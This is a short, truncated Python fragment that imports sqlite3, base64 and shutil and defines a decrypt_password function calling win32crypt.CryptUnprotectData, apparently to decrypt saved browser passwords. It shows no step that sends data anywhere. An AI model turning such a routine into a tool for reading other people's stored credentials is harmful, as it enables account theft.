import os
# file deepcode ignore PythonDuplicateImport: <please specify a reason of ignoring this>
import json
import base64
import sqlite3
import shutil
...
def decrypt_password(enc_password, key):
    try:
        ...
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) # type: ignore
        except:
